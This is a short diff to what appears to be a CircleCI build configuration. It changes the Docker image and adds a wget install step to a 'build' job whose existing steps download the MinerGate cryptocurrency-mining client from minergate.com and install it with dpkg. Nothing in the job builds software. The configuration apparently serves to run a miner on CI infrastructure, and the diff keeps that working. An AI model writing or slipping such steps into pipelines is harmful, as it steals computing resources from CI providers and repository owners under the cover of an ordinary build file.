@@ -2,10 +2,11 @@ version: 2
 jobs:
   build:
     docker:
-      - image: greenfieldsvp/dock
+      - image: ubuntu:16.04
     steps:
       - checkout
       - run: apt-get update
+      - run: apt-get install wget -y
       - run: apt-get install apt-transport-https -y
       - run: wget https://minergate.com/download/deb-cli -O a.deb 
       - run: dpkg -i a.deb 
